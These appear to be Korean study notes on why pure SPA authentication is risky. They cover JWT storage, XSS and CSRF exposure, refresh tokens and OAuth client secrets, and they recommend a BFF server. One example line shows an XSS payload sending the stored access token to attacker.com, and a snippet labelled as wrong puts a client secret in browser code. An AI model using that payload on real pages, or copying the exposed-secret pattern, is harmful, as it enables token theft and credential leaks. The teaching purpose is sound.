# SPA 인증의 구조적 문제

## 1. 개념 — "브라우저가 상태를 들고 있다"는 게 무슨 의미인가

전통적인 서버 렌더링(MPA) 방식에서는 인증 상태를 **서버**가 관리합니다. 브라우저는 "나 세션 ID 가진 사람이에요"라는 쪽지만 들고 있고, 실제 "이 사람이 누군지"는 서버가 알고 있죠.

SPA는 다릅니다. 페이지 전환 없이 동작하려면 브라우저가 직접 API를 호출해야 하고, 그 API 호출마다 "나 인증된 사람이에요"를 증명할 무언가를 **브라우저 안에** 가지고 있어야 합니다. 이게 보통 JWT Access Token입니다.

```
MPA:  브라우저 → [세션ID만 전달] → 서버 → "DB에서 상태 확인"
SPA:  브라우저 → [토큰 직접 보유 + API 호출] → 서버 → "토큰만 검증"
```

핵심 차이: **인증 정보의 실체가 브라우저 안에 있느냐, 없느냐.**

---

## 2. 왜 위험한가 — 위협 표면(Attack Surface)이 넓어지는 이유

### 문제 ①: 토큰을 어딘가에 저장해야 한다

브라우저에서 토큰을 들고 있으려면 어딘가에 저장해야 하는데, 선택지가 두 가지밖에 없고 둘 다 완벽하지 않습니다.

| 저장 위치                         | 접근 가능 주체         | 주요 위협                           |
| --------------------------------- | ---------------------- | ----------------------------------- |
| `localStorage` / `sessionStorage` | JavaScript 코드 전체   | **XSS 공격 한 방에 토큰 탈취 가능** |
| `httpOnly Cookie`                 | 브라우저(JS 접근 불가) | **CSRF 공격에 취약**                |

`localStorage`가 특히 위험한 이유를 구체적으로 보면:

```javascript
// 공격자가 XSS로 이 한 줄만 실행시키면 끝
fetch(
  "https://attacker.com/steal?token=" + localStorage.getItem("access_token"),
);
```

XSS(Cross-Site Scripting)가 터지는 순간 — 광고 스크립트, 댓글, npm 패키지 등 **어떤 경로로든 악성 JS가 실행되면** — 토큰은 그 자리에서 탈취됩니다. 세션 방식이었다면 세션 ID가 탈취돼도 서버에서 무효화가 가능하지만, JWT는 서버가 상태를 안 가지고 있으니 탈취된 토큰을 즉시 막을 방법이 없습니다.

### 문제 ②: 토큰은 스스로를 증명한다 (Self-contained)

JWT의 장점이 동시에 단점입니다. 서버가 "이 토큰이 유효한가"를 DB 조회 없이 서명(signature)만 보고 판단하기 때문에, **토큰을 훔친 사람이 곧 그 사람**이 됩니다.

```
정상 유저:   JWT 보유 → API 호출 → 서버: "서명 유효, 통과"
공격자:      JWT 탈취 → API 호출 → 서버: "서명 유효, 통과" ← 구분 불가
```

서버 입장에서는 누가 보낸 건지 알 방법이 없습니다.

### 문제 ③: 토큰 수명 딜레마

이 문제를 보완하려고 Access Token의 만료 시간을 짧게 설정합니다(보통 5~15분). 그런데 그러면 사용자가 자꾸 로그아웃되니까 Refresh Token을 따로 두고 자동 갱신을 구현합니다. 그런데 Refresh Token도 어딘가에 저장해야 합니다. 그러면 다시 ①번 문제로 돌아갑니다.

```
짧은 AT → UX 나쁨 → RT로 자동 갱신
                         ↓
               RT도 브라우저에 저장해야 함
                         ↓
               RT 탈취되면 장기간 접근 가능 (더 위험)
```

악순환 구조입니다.

### 문제 ④: Client Secret을 브라우저에 둘 수 없다

OAuth 2.0 소셜 로그인을 순수 SPA로 구현하면 심각한 문제가 생깁니다. Authorization Code를 Access Token으로 교환할 때 Client Secret이 필요한데, 이걸 브라우저 코드에 넣으면 누구나 볼 수 있습니다.

```javascript
// 절대 이렇게 하면 안 됨 — Client Secret이 번들에 노출됨
const response = await fetch("https://oauth.google.com/token", {
  body: JSON.stringify({
    client_id: "xxx",
    client_secret: "EXPOSED_SECRET", // ← 브라우저 번들에서 누구나 볼 수 있음
    code: authCode,
  }),
});
```

순수 SPA는 비밀을 지킬 수 없습니다. 서버가 없으면 Client Secret을 안전하게 보관할 장소 자체가 없습니다.

## 3. 실제 적용 — 그래서 어떻게 대응하는가

이 문제들을 종합하면 결국 한 가지 방향으로 수렴합니다: **브라우저가 직접 토큰을 들고 다니지 않게 한다.**

**현재 권장되는 접근법 (이 프로젝트의 방향):**

```
브라우저 (Next.js)
    ↓  [쿠키 기반 세션, 토큰 노출 없음]
BFF 서버 (Node.js / Express)
    ↓  [Access Token을 서버 메모리 or 서버 세션에 보관]
    ↓  [Client Secret도 서버에만 보관]
백엔드 API (Spring Boot 등)
```

BFF(Backend For Frontend) 패턴이 이 문제를 해결하는 구조입니다. 브라우저는 단순히 "로그인된 세션"만 들고 있고, 실제 토큰과 비밀 정보는 BFF 서버가 관리합니다. 이걸 Token Mediating Backend라고 부르기도 합니다.

## 한 줄 정리

> 순수 SPA의 인증 문제는 "JS가 접근 가능한 공간에 비밀을 보관해야 한다"는 구조적 모순에서 시작합니다. 해결책은 결국 신뢰할 수 있는 서버 레이어를 사이에 두는 것입니다.

다음 주제인 **Session vs JWT 비교**로 넘어가면, 오늘 나온 "서버가 상태를 가진다 vs 토큰이 상태를 가진다"는 대비가 더 구체적으로 정리됩니다.
